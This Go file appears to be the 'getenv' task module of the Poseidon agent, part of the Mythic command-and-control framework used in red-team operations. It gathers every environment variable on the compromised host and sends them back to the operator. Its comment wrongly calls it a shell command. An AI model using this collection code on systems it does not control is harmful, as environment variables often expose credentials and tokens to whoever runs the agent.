package getenv

import (
	// Standard

	"os"
	"strings"

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

//Run - Function that executes the shell command
func Run(task structs.Task) {
	msg := structs.Response{}
	msg.TaskID = task.TaskID
	msg.UserOutput = strings.Join(os.Environ(), "\n")
	msg.Completed = true
	task.Job.SendResponses <- msg
	return
}
